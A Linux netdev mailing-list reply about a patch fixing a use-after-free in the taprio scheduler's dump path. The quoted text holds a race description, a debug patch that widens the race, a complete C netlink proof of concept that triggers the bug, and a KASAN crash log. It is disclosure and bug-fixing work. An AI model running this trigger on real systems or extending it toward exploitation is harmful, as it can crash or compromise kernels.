Return-Path: <netdev+bounces-61302-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
	by mail.lfdr.de (Postfix) with ESMTPS id 9AAC68232FD
	for <lists+netdev@lfdr.de>; Wed,  3 Jan 2024 18:14:35 +0100 (CET)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by am.mirrors.kernel.org (Postfix) with ESMTPS id 2203B1F24EDD
	for <lists+netdev@lfdr.de>; Wed,  3 Jan 2024 17:14:35 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id DF41F1C290;
	Wed,  3 Jan 2024 17:14:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="A1MXRjCC"
X-Original-To: netdev@vger.kernel.org
Received: from mail-ed1-f50.google.com (mail-ed1-f50.google.com [209.85.208.50])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1D5EC1BDFB
	for <netdev@vger.kernel.org>; Wed,  3 Jan 2024 17:14:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
Received: by mail-ed1-f50.google.com with SMTP id 4fb4d7f45d1cf-55679552710so12482a12.1
        for <netdev@vger.kernel.org>; Wed, 03 Jan 2024 09:14:23 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20230601; t=1704302062; x=1704906862; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=IgOqws3kYtZJXJWOHTcQSNk4fnGFcRG+8sFcVRFCYhY=;
        b=A1MXRjCCWHF19JxR4uELdNK9tf6aJMKl5Hjw1GiGSqSHaxpVitnMjNZ1anuU77eFjf
         MvyzkjHzWXUS5lxeuNE5osx+JQG5NzZ+mXVGmorhdsrr0IBsA8q3k3EI9DArTYTQBVRh
         r7ljLZckfbmpIRxAX2EeLm5n/IyyR7XEctnARG1418ovOUurG/48iLRcmNSJHPieASHB
         X6bfZWWnlVp51i8YEeLX2/5WWFQoqoqnAZ7Bn+531mDEt1+YJ2ceFw2DpkiZV4oADUyz
         GMs6pmSnir3csHxo1N++QNfj7VuSsEtH540reBqy7r3P3QtH1dYzQXbmS/0TpEWTw1RI
         I54g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1704302062; x=1704906862;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=IgOqws3kYtZJXJWOHTcQSNk4fnGFcRG+8sFcVRFCYhY=;
        b=iTkE58iexngzuCi3upMF2HQCxPQmukTwoWskX1M2mA67e0BuVo2/1aLnqNCY3n7Lg+
         mKVOj/F4YBOVZBasgSvRzWQzD2OdwOvYKpGuy9JltR5u4VY9aIBnSnBUgjnvqPxn0lCy
         OEbVqpMF36N5mpz5/dO2wBjZT/xTQVGEgI6+qhQ59l4GaqOigKMBNz5aKXl8liIjS2TJ
         IJMLZOE2aTKhieQonQZC4rib4nnhnV6ZdZvNFlhEqVmK7qa67JfHrANDS4yBQMJKpB94
         Lt+xChONUiQFbDZ6mpukwCLfWm75qn/ssK8R6qBSuJEwA9/yCzsWnTRRjyOw2IarVdHu
         BZpA==
X-Gm-Message-State: AOJu0YxukFkf2P8bnlqjJEaFAzMEL2DGSnU5tfjvjTAevQToF86yKbeB
	5abSE3lqKhie9oo4lTNWA20fjMlicS63zj/birPag0sVrEm+
X-Google-Smtp-Source: AGHT+IHzoMjp5x/ZJHpGtKu2VLlqJ1SEDosCfvhyFSkUPzvnN1hSTZtWXfjTW1A7Fiog/sXOTbEe4KiAWE5jvjsOxjg=
X-Received: by 2002:a50:f696:0:b0:554:228f:4b8e with SMTP id
 d22-20020a50f696000000b00554228f4b8emr182428edn.2.1704302061865; Wed, 03 Jan
 2024 09:14:21 -0800 (PST)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20240103023348.71473-1-bob.p0pk3rn@gmail.com> <8734ve5p9f.fsf@intel.com>
In-Reply-To: <8734ve5p9f.fsf@intel.com>
From: Eric Dumazet <edumazet@google.com>
Date: Wed, 3 Jan 2024 18:14:10 +0100
Message-ID: <CANn89i+9ZgC9tCQTMp39nG5PFc_M6+wAA2RvT9M7q+y0gMfA6w@mail.gmail.com>
Subject: Re: [PATCH] net/sched: taprio: fix use-after-free in taprio_dump
To: Vinicius Costa Gomes <vinicius.gomes@intel.com>
Cc: Team p0pk3rn <bob.p0pk3rn@gmail.com>, netdev@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Wed, Jan 3, 2024 at 5:57=E2=80=AFPM Vinicius Costa Gomes
<vinicius.gomes@intel.com> wrote:
>
> Hi,
>
> Team p0pk3rn <bob.p0pk3rn@gmail.com> writes:
>
> > Hi, We suggest patch for fixing use-after-free in taprio_dump.
> >
> > If it has old sched_gate_list structure in taprio_dump function and the=
 object gets freed by taprio_free_sched_cb,
> > freed sched_gate_list structure can be used while replacing oper_sched =
in switch_schedules.
> > Followings are race scenario, poc, patch and header file for poc, KASAN=
 crash log, and suggested patch.
> > We suggest applying rcu patch on dereferencing the structure like in co=
mmit, taprio: Add support adding an admin schedule (a3d43c0d56f1)
> >
> >
> > switch_schedules                                                       =
      taprio_dump
> >
> >                                                                        =
      oper =3D rtnl_dereference(q->oper_sched);
> > rcu_assign_pointer(q->oper_sched, *admin);
> > rcu_assign_pointer(q->admin_sched, NULL);
> > call_rcu(&(*oper)->rcu, taprio_free_sched_cb);
> > kfree(sched);
> >                                                                        =
      if (oper && taprio_dump_tc_entries(skb, q, oper))
> >                                                                        =
      if (nla_put_u32(skb, TCA_TAPRIO_TC_ENTRY_MAX_SDU, sched->max_sdu[tc])=
) // UAF
> >
> >
>
> Please follow the guidelines for the commit message here:
>
> https://docs.kernel.org/process/submitting-patches.html#describe-your-cha=
nges
>
> Consistency in formatting and language used in the commit message help a
> lot when understanding the fix in the future.
>
> There are a few rules associated with you signing off the patch, take a
> look here:
> https://docs.kernel.org/process/submitting-patches.html#sign-your-work-th=
e-developer-s-certificate-of-origin
>
> Some other tips:
>  - use the output of script/get_maintainer.pl when adding the
>  maintainers;
>  - Also check checkpatch.pl errors/warnings, and fix them (I think you
>  would see some errors related about the commit message formatting/long
>  lines);
>
> About the commit message, we are more interested in you showing/proving
> that this is the correct fix. In this case, I am interested in a better
> explanation about why we should mark the dump side as a "rcu_read
> critical" vs. depending on the rtnl lock.
>
> The patch that you used to reproduce the crash more consistently is
> interesting, but could be minimized or only explained. Or a link to a
> github gist/similar, and added to the notes/cover letter.
>
> The userspace reproducer can be only a link in the commit message, or,
> even better, in the "notes"/cover letter of the patch.
>
> The KASAN report is important, it should be included, as you already
> did.
>
> Now, about the code itself, from my mental model (a bit slower than
> usual after the holidays), it looks fine, but I look forward for
> improved details in the commit message, to see if I am missing anything.
>
> Sorry for the long email. Hope it helped.

As pointed out in a recent thread, taprio calls switch_schedules()
from advance_sched(), without holding RTNL.

All reads of q->oper_sched and q->admin_sched should use bare
rcu_dereference(), unless we make sure
switch_schedules() can not be triggered concurrently.

I think a deep investigation is needed.



>
> > poc.patch:
> > ```
> > diff --git a/net/sched/sch_taprio.c b/net/sched/sch_taprio.c
> > index 31a8252bd09c..48138a8a59a8 100644
> > --- a/net/sched/sch_taprio.c
> > +++ b/net/sched/sch_taprio.c
> > @@ -980,6 +980,8 @@ static enum hrtimer_restart advance_sched(struct hr=
timer *timer)
> >               /* Set things so the next time this runs, the new
> >                * schedule runs.
> >                */
> > +             printk(KERN_ALERT "[CPU:%d] advance_sched -> switch_sched=
ules (current->comm: %s)\n", smp_processor_id(), current->comm);
> > +             mdelay(10);
> >               end_time =3D sched_base_time(admin);
> >               switch_schedules(q, &admin, &oper);
> >       }
> > @@ -2396,7 +2398,7 @@ static int taprio_dump(struct Qdisc *sch, struct =
sk_buff *skb)
> >
> >       oper =3D rtnl_dereference(q->oper_sched);
> >       admin =3D rtnl_dereference(q->admin_sched);
> > -
> > +     if(!strcmp(current->comm,"poc")){printk(KERN_ALERT "[CPU:%d] tapr=
io_dump (oper: 0x%lx)\n", smp_processor_id(), oper);ssleep(1);}
> >       mqprio_qopt_reconstruct(dev, &opt);
> >
> >       nest =3D nla_nest_start_noflag(skb, TCA_OPTIONS);
> > ```
> >
> > list.h:
> > ```c
> > /* SPDX-License-Identifier: GPL-2.0 */
> >     #ifndef __LIST_H__
> >     #define __LIST_H__ 1
> >     /* List and hash list stuff from kernel */
> >
> >     #include <stddef.h>
> >
> >     #define container_of(ptr, type, member) ({                        \
> >       const typeof( ((type *)0)->member ) *__mptr =3D (ptr);    \
> >       (type *)( (char *)__mptr - offsetof(type,member) );})
> >
> >     struct list_head {
> >       struct list_head *next, *prev;
> >     };
> >
> >     static inline void INIT_LIST_HEAD(struct list_head *list)
> >     {
> >       list->next =3D list;
> >       list->prev =3D list;
> >     }
> >
> >     static inline void __list_add(struct list_head *new,
> >                             struct list_head *prev,
> >                             struct list_head *next)
> >     {
> >       next->prev =3D new;
> >       new->next =3D next;
> >       new->prev =3D prev;
> >       prev->next =3D new;
> >     }
> >
> >     static inline void list_add(struct list_head *new, struct list_head=
 *head)
> >     {
> >       __list_add(new, head, head->next);
> >     }
> >
> >     static inline void list_add_tail(struct list_head *new, struct list=
_head *head)
> >     {
> >       __list_add(new, head->prev, head);
> >     }
> >
> >     static inline void __list_del(struct list_head *prev, struct list_h=
ead *next)
> >     {
> >       next->prev =3D prev;
> >       prev->next =3D next;
> >     }
> >
> >     static inline void list_del(struct list_head *entry)
> >     {
> >       __list_del(entry->prev, entry->next);
> >     }
> >
> >     #define list_entry(ptr, type, member) \
> >       container_of(ptr, type, member)
> >
> >     #define list_first_entry(ptr, type, member) \
> >       list_entry((ptr)->next, type, member)
> >
> >     #define list_last_entry(ptr, type, member) \
> >       list_entry((ptr)->prev, type, member)
> >
> >     #define list_next_entry(pos, member) \
> >       list_entry((pos)->member.next, typeof(*(pos)), member)
> >
> >     #define list_prev_entry(pos, member) \
> >       list_entry((pos)->member.prev, typeof(*(pos)), member)
> >
> >     #define list_for_each_entry(pos, head, member)                     =
       \
> >       for (pos =3D list_first_entry(head, typeof(*pos), member);       =
 \
> >            &pos->member !=3D (head);                                   =
 \
> >            pos =3D list_next_entry(pos, member))
> >
> >     #define list_for_each_entry_safe(pos, n, head, member)             =
       \
> >       for (pos =3D list_first_entry(head, typeof(*pos), member),       =
 \
> >               n =3D list_next_entry(pos, member);                      =
 \
> >            &pos->member !=3D (head);                                   =
 \
> >            pos =3D n, n =3D list_next_entry(n, member))
> >
> >     #define list_for_each_entry_reverse(pos, head, member)             =
       \
> >       for (pos =3D list_last_entry(head, typeof(*pos), member);        =
 \
> >            &pos->member !=3D (head);                                   =
 \
> >            pos =3D list_prev_entry(pos, member))
> >
> >     struct hlist_head {
> >       struct hlist_node *first;
> >     };
> >
> >     struct hlist_node {
> >       struct hlist_node *next, **pprev;
> >     };
> >
> >     static inline void hlist_del(struct hlist_node *n)
> >     {
> >       struct hlist_node *next =3D n->next;
> >       struct hlist_node **pprev =3D n->pprev;
> >       *pprev =3D next;
> >       if (next)
> >               next->pprev =3D pprev;
> >     }
> >
> >     static inline void hlist_add_head(struct hlist_node *n, struct hlis=
t_head *h)
> >     {
> >       struct hlist_node *first =3D h->first;
> >       n->next =3D first;
> >       if (first)
> >               first->pprev =3D &n->next;
> >       h->first =3D n;
> >       n->pprev =3D &h->first;
> >     }
> >
> >     static inline int list_empty(const struct list_head *head)
> >     {
> >       return head->next =3D=3D head;
> >     }
> >
> >     #define hlist_for_each(pos, head) \
> >       for (pos =3D (head)->first; pos ; pos =3D pos->next)
> >
> >
> >     #define hlist_for_each_safe(pos, n, head) \
> >       for (pos =3D (head)->first; pos && ({ n =3D pos->next; 1; }); \
> >            pos =3D n)
> >
> >     #define hlist_entry_safe(ptr, type, member) \
> >       ({ typeof(ptr) ____ptr =3D (ptr); \
> >          ____ptr ? hlist_entry(____ptr, type, member) : NULL; \
> >       })
> >
> >     #define hlist_for_each_entry(pos, head, member)                    =
       \
> >       for (pos =3D hlist_entry_safe((head)->first, typeof(*(pos)), memb=
er);\
> >            pos;                                                       \
> >            pos =3D hlist_entry_safe((pos)->member.next, typeof(*(pos)),=
 member))
> >
> >     #endif /* __LIST_H__ */
> >       ```
> >
> > poc.c:
> > ```c
> >     #include <stdio.h>
> >     #include <asm/types.h>
> >     #include <sys/types.h>
> >     #include <linux/pkt_sched.h>
> >     #include <linux/netlink.h>
> >     #include <linux/rtnetlink.h>
> >     #include <sys/socket.h>
> >     #include <string.h>
> >     #include <errno.h>
> >     #include <unistd.h>
> >     #include <pthread.h>
> >     #include <stdlib.h>
> >     #include <sys/prctl.h>
> >     #include <stdint.h>
> >     #include "list.h"
> >
> >     #ifndef max
> >     #define max(a,b) (((a) > (b)) ? (a) : (b))
> >     #endif
> >
> >     #define TCA_TAPRIO_ATTR_TC_ENTRY 12
> >
> >     enum {
> >       TCA_TAPRIO_TC_ENTRY_UNSPEC,
> >       TCA_TAPRIO_TC_ENTRY_INDEX,              /* u32 */
> >       TCA_TAPRIO_TC_ENTRY_MAX_SDU,            /* u32 */
> >       TCA_TAPRIO_TC_ENTRY_FP,                 /* u32 */
> >
> >       /* add new constants above here */
> >       __TCA_TAPRIO_TC_ENTRY_CNT,
> >       TCA_TAPRIO_TC_ENTRY_MAX =3D (__TCA_TAPRIO_TC_ENTRY_CNT - 1)
> >     };
> >
> >     #define DEV_INDEX 2 // dev->num_tx_queues > 1
> >     #define TCA_BUF_MAX       (64*1024)
> >     #define NLMSG_TAIL(nmsg) \
> >       ((struct rtattr *) (((void *) (nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg=
_len)))
> >
> >     struct sched_entry {
> >       struct list_head list;
> >       uint32_t index;
> >       uint32_t interval;
> >       uint32_t gatemask;
> >       uint8_t cmd;
> >     };
> >
> >     struct req {
> >       struct nlmsghdr nl;
> >       struct tcmsg tc;
> >       char buf[TCA_BUF_MAX];
> >     };
> >
> >     int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void =
*data,
> >             int alen)
> >     {
> >       int len =3D RTA_LENGTH(alen);
> >       struct rtattr *rta;
> >
> >       if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
> >               fprintf(stderr,
> >                       "addattr_l ERROR: message exceeded bound of %d\n"=
,
> >                       maxlen);
> >               return -1;
> >       }
> >       rta =3D NLMSG_TAIL(n);
> >       rta->rta_type =3D type;
> >       rta->rta_len =3D len;
> >       if (alen)
> >               memcpy(RTA_DATA(rta), data, alen);
> >       n->nlmsg_len =3D NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
> >       return 0;
> >     }
> >
> >     struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int typ=
e)
> >     {
> >       struct rtattr *nest =3D NLMSG_TAIL(n);
> >
> >       addattr_l(n, maxlen, type, NULL, 0);
> >       return nest;
> >     }
> >
> >     int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
> >     {
> >       nest->rta_len =3D (void *)NLMSG_TAIL(n) - (void *)nest;
> >       return n->nlmsg_len;
> >     }
> >
> >     static struct sched_entry *create_entry(uint32_t gatemask, uint32_t=
 interval, uint8_t cmd)
> >     {
> >       struct sched_entry *e;
> >
> >       e =3D calloc(1, sizeof(*e));
> >       if (!e)
> >               return NULL;
> >
> >       e->gatemask =3D gatemask;
> >       e->interval =3D interval;
> >       e->cmd =3D cmd;
> >
> >       return e;
> >     }
> >
> >     static int add_sched_list(struct list_head *sched_entries, struct n=
lmsghdr *n)
> >     {
> >       struct sched_entry *e;
> >
> >       list_for_each_entry(e, sched_entries, list) {
> >               struct rtattr *a;
> >
> >               a =3D addattr_nest(n, 1024, TCA_TAPRIO_SCHED_ENTRY);
> >
> >               addattr_l(n, 1024, TCA_TAPRIO_SCHED_ENTRY_CMD, &e->cmd, s=
izeof(e->cmd));
> >               addattr_l(n, 1024, TCA_TAPRIO_SCHED_ENTRY_GATE_MASK, &e->=
gatemask, sizeof(e->gatemask));
> >               addattr_l(n, 1024, TCA_TAPRIO_SCHED_ENTRY_INTERVAL, &e->i=
nterval, sizeof(e->interval));
> >
> >               addattr_nest_end(n, a);
> >       }
> >
> >       return 0;
> >     }
> >
> >     int create_taprio() {
> >         int fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
> >         if(fd =3D=3D -1) {
> >             printf("Error in socket: %s\n", strerror(errno));
> >             return -1;
> >         }
> >
> >         struct sockaddr_nl la;
> >         memset((void *)&la, 0, sizeof(struct sockaddr_nl));
> >         la.nl_family =3D AF_NETLINK;
> >         la.nl_pid =3D 0;
> >
> >         if(bind(fd, (struct sockaddr*)&la, sizeof(la)) =3D=3D -1) {
> >             printf("Error in bind: %s\n", strerror(errno));
> >             return -1;
> >         }
> >
> >         struct req d;
> >         memset((void *)&d, 0, sizeof(struct req));
> >         d.nl.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct tcmsg));
> >         d.nl.nlmsg_type =3D RTM_NEWQDISC;
> >         d.nl.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_DUMP | NLM_F_CREATE =
| NLM_F_ACK | NLM_F_REPLACE;
> >         d.nl.nlmsg_seq =3D 0;
> >         d.nl.nlmsg_pid =3D 0;
> >
> >         d.tc.tcm_family =3D AF_UNSPEC;
> >         d.tc.tcm_ifindex =3D DEV_INDEX;
> >         d.tc.tcm_handle =3D 0;
> >         d.tc.tcm_parent =3D TC_H_ROOT;
> >         d.tc.tcm_info =3D 0;
> >
> >         char data[] =3D "taprio";
> >         addattr_l(&d.nl, sizeof(d), TCA_KIND, data, strlen(data)+1);
> >
> >       struct rtattr *tail, *l;
> >       tail =3D NLMSG_TAIL(&d.nl);
> >       addattr_l(&d.nl, sizeof(d), TCA_OPTIONS, NULL, 0);
> >
> >       clockid_t clockid =3D CLOCK_TAI;
> >       addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_CLOCKID, &clock=
id, sizeof(clockid));
> >
> >       struct tc_mqprio_qopt opt =3D { };
> >       opt.num_tc =3D 3;
> >       unsigned char prio_tc_map[] =3D { 2, 2, 1, 0, 2, 2, 2, 2, 2, 2, 2=
, 2, 2, 2, 2, 2 };
> >       memcpy(&opt.prio_tc_map, prio_tc_map, sizeof(prio_tc_map));
> >
> >       opt.count[0] =3D 1;
> >       opt.offset[0] =3D 0;
> >       opt.count[1] =3D 1;
> >       opt.offset[1] =3D 1;
> >       opt.count[2] =3D 2;
> >       opt.offset[2] =3D 2;
> >
> >       addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_PRIOMAP, &opt, sizeof=
(opt));
> >
> >       unsigned long base_time =3D 1528743495910289988;
> >       addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_BASE_TIME, &bas=
e_time, sizeof(base_time));
> >
> >       struct sched_entry *e;
> >       struct list_head sched_entries;
> >       INIT_LIST_HEAD(&sched_entries);
> >
> >       int cmd;
> >       unsigned int mask;
> >       unsigned int interval;
> >
> >       cmd =3D TC_TAPRIO_CMD_SET_GATES;
> >       mask =3D 0x01;
> >       interval =3D 0300000;
> >       e =3D create_entry(mask, interval, cmd);
> >       list_add_tail(&e->list, &sched_entries);
> >
> >       cmd =3D TC_TAPRIO_CMD_SET_GATES;
> >       mask =3D 0x02;
> >       interval =3D 0300000;
> >       e =3D create_entry(mask, interval, cmd);
> >       list_add_tail(&e->list, &sched_entries);
> >
> >       cmd =3D TC_TAPRIO_CMD_SET_GATES;
> >       mask =3D 0x04;
> >       interval =3D 0300000;
> >       e =3D create_entry(mask, interval, cmd);
> >       list_add_tail(&e->list, &sched_entries);
> >
> >       l =3D addattr_nest(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_ENTRY_=
LIST | NLA_F_NESTED);
> >
> >       add_sched_list(&sched_entries, &d.nl);
> >
> >       addattr_nest_end(&d.nl, l);
> >
> >       tail->rta_len =3D (void *) NLMSG_TAIL(&d.nl) - (void *) tail;
> >
> >         struct msghdr msg;
> >         memset((void *)&msg, 0, sizeof(struct msghdr));
> >         msg.msg_name =3D (void *)&la;
> >         msg.msg_namelen =3D sizeof(la);
> >
> >         struct iovec iov;
> >         memset((void *)&iov, 0, sizeof(struct iovec));
> >         iov.iov_base =3D (void *)&d.nl;
> >         iov.iov_len =3D d.nl.nlmsg_len;
> >
> >         msg.msg_iov =3D &iov;
> >         msg.msg_iovlen =3D 1;
> >
> >         if(sendmsg(fd, &msg, 0) =3D=3D -1) {
> >             printf("Error in sendmsg: %s\n", strerror(errno));
> >             return -1;
> >         }
> >         close(fd);
> >         return 1;
> >     }
> >
> >     int change_taprio() {
> >         int fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
> >         if(fd =3D=3D -1) {
> >             printf("Error in socket: %s\n", strerror(errno));
> >             return -1;
> >         }
> >
> >         struct sockaddr_nl la;
> >         memset((void *)&la, 0, sizeof(struct sockaddr_nl));
> >         la.nl_family =3D AF_NETLINK;
> >         la.nl_pid =3D 0;
> >
> >         if(bind(fd, (struct sockaddr*)&la, sizeof(la)) =3D=3D -1) {
> >             printf("Error in bind: %s\n", strerror(errno));
> >             return -1;
> >         }
> >
> >         struct req d;
> >         memset((void *)&d, 0, sizeof(struct req));
> >         d.nl.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct tcmsg));
> >         d.nl.nlmsg_type =3D RTM_NEWQDISC;
> >         d.nl.nlmsg_flags =3D NLM_F_REQUEST & ~NLM_F_EXCL;
> >         d.nl.nlmsg_seq =3D 0;
> >         d.nl.nlmsg_pid =3D 0;
> >
> >         d.tc.tcm_family =3D AF_UNSPEC;
> >         d.tc.tcm_ifindex =3D DEV_INDEX;
> >         d.tc.tcm_handle =3D 0x80010000;
> >         d.tc.tcm_parent =3D TC_H_UNSPEC;
> >         d.tc.tcm_info =3D 0;
> >
> >         char data[] =3D "taprio";
> >         addattr_l(&d.nl, sizeof(d), TCA_KIND, data, strlen(data)+1);
> >
> >       struct rtattr *tail, *l;
> >       tail =3D NLMSG_TAIL(&d.nl);
> >       addattr_l(&d.nl, sizeof(d), TCA_OPTIONS, NULL, 0);
> >
> >       clockid_t clockid =3D CLOCK_TAI;
> >       addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_CLOCKID, &clock=
id, sizeof(clockid));
> >
> >       struct tc_mqprio_qopt opt =3D { };
> >       opt.num_tc =3D 3;
> >       unsigned char prio_tc_map[] =3D { 2, 2, 1, 0, 2, 2, 2, 2, 2, 2, 2=
, 2, 2, 2, 2, 2 };
> >       memcpy(&opt.prio_tc_map, prio_tc_map, sizeof(prio_tc_map));
> >
> >       opt.count[0] =3D 1;
> >       opt.offset[0] =3D 0;
> >       opt.count[1] =3D 1;
> >       opt.offset[1] =3D 1;
> >       opt.count[2] =3D 2;
> >       opt.offset[2] =3D 2;
> >
> >       addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_PRIOMAP, &opt, sizeof=
(opt));
> >
> >       unsigned long base_time =3D 1528743495910289988;
> >       addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_BASE_TIME, &bas=
e_time, sizeof(base_time));
> >
> >       struct sched_entry *e;
> >       struct list_head sched_entries;
> >       INIT_LIST_HEAD(&sched_entries);
> >
> >       int cmd;
> >       unsigned int mask;
> >       unsigned int interval;
> >
> >       cmd =3D TC_TAPRIO_CMD_SET_GATES;
> >       mask =3D 0x01;
> >       interval =3D 0300000;
> >       e =3D create_entry(mask, interval, cmd);
> >       list_add_tail(&e->list, &sched_entries);
> >
> >       cmd =3D TC_TAPRIO_CMD_SET_GATES;
> >       mask =3D 0x02;
> >       interval =3D 0300000;
> >       e =3D create_entry(mask, interval, cmd);
> >       list_add_tail(&e->list, &sched_entries);
> >
> >       cmd =3D TC_TAPRIO_CMD_SET_GATES;
> >       mask =3D 0x04;
> >       interval =3D 0300000;
> >       e =3D create_entry(mask, interval, cmd);
> >       list_add_tail(&e->list, &sched_entries);
> >
> >       l =3D addattr_nest(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_ENTRY_=
LIST | NLA_F_NESTED);
> >
> >       add_sched_list(&sched_entries, &d.nl);
> >
> >       addattr_nest_end(&d.nl, l);
> >
> >       tail->rta_len =3D (void *) NLMSG_TAIL(&d.nl) - (void *) tail;
> >
> >         struct msghdr msg;
> >         memset((void *)&msg, 0, sizeof(struct msghdr));
> >         msg.msg_name =3D (void *)&la;
> >         msg.msg_namelen =3D sizeof(la);
> >
> >         struct iovec iov;
> >         memset((void *)&iov, 0, sizeof(struct iovec));
> >         iov.iov_base =3D (void *)&d.nl;
> >         iov.iov_len =3D d.nl.nlmsg_len;
> >
> >         msg.msg_iov =3D &iov;
> >         msg.msg_iovlen =3D 1;
> >
> >         if(sendmsg(fd, &msg, 0) =3D=3D -1) {
> >             printf("Error in sendmsg: %s\n", strerror(errno));
> >             return -1;
> >         }
> >         close(fd);
> >         return 1;
> >     }
> >
> >     int main() {
> >       puts("creating taprio..");
> >         create_taprio();
> >       while (1) {
> >               puts("changing taprio..");
> >               change_taprio();
> >               sleep(1);
> >       }
> >         return 0;
> >     }
> >       ```
> >
> > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> >     BUG: KASAN: slab-use-after-free in taprio_dump_tc_entries net/sched=
/sch_taprio.c:2306 [inline]
> >     BUG: KASAN: slab-use-after-free in taprio_dump+0xb2b/0xc70 net/sche=
d/sch_taprio.c:2420
> >     Read of size 4 at addr ffff88805d203cc0 by task syz-executor.7/4200=
4
> >
> >     CPU: 0 PID: 42004 Comm: syz-executor.7 Not tainted 6.7.0-rc4 #1
> >     Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-=
1 04/01/2014
> >     Call Trace:
> >      <TASK>
> >      __dump_stack lib/dump_stack.c:88 [inline]
> >      dump_stack_lvl+0xd9/0x150 lib/dump_stack.c:106
> >      print_address_description.constprop.0+0x2c/0x3c0 mm/kasan/report.c=
:364
> >      print_report+0xab/0x250 mm/kasan/report.c:475
> >      kasan_report+0xbe/0xf0 mm/kasan/report.c:588
> >      taprio_dump_tc_entries net/sched/sch_taprio.c:2306 [inline]
> >      taprio_dump+0xb2b/0xc70 net/sched/sch_taprio.c:2420
> >      tc_fill_qdisc+0x5e6/0x1220 net/sched/sch_api.c:952
> >      qdisc_notify.isra.0+0x2c1/0x330 net/sched/sch_api.c:1024
> >      tc_modify_qdisc+0x7be/0x1860 net/sched/sch_api.c:1719
> >      rtnetlink_rcv_msg+0x3cb/0xf10 net/core/rtnetlink.c:6558
> >      netlink_rcv_skb+0x165/0x420 net/netlink/af_netlink.c:2545
> >      netlink_unicast_kernel net/netlink/af_netlink.c:1342 [inline]
> >      netlink_unicast+0x54d/0x810 net/netlink/af_netlink.c:1368
> >      netlink_sendmsg+0x92f/0xe50 net/netlink/af_netlink.c:1910
> >      sock_sendmsg_nosec net/socket.c:730 [inline]
> >      __sock_sendmsg+0xda/0x180 net/socket.c:745
> >      ____sys_sendmsg+0x70f/0x870 net/socket.c:2584
> >      ___sys_sendmsg+0x11d/0x1b0 net/socket.c:2638
> >      __sys_sendmsg+0xfe/0x1d0 net/socket.c:2667
> >      do_syscall_x64 arch/x86/entry/common.c:51 [inline]
> >      do_syscall_64+0x3f/0xe0 arch/x86/entry/common.c:82
> >      entry_SYSCALL_64_after_hwframe+0x63/0x6b
> >     RIP: 0033:0x7f56f368ed2d
> >     Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 4=
8 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01=
 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
> >     RSP: 002b:00007f56f43e5028 EFLAGS: 00000246 ORIG_RAX: 0000000000000=
02e
> >     RAX: ffffffffffffffda RBX: 00007f56f37cbf80 RCX: 00007f56f368ed2d
> >     RDX: 0000000000000000 RSI: 00000000200007c0 RDI: 0000000000000004
> >     RBP: 00007f56f36f04a6 R08: 0000000000000000 R09: 0000000000000000
> >     R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
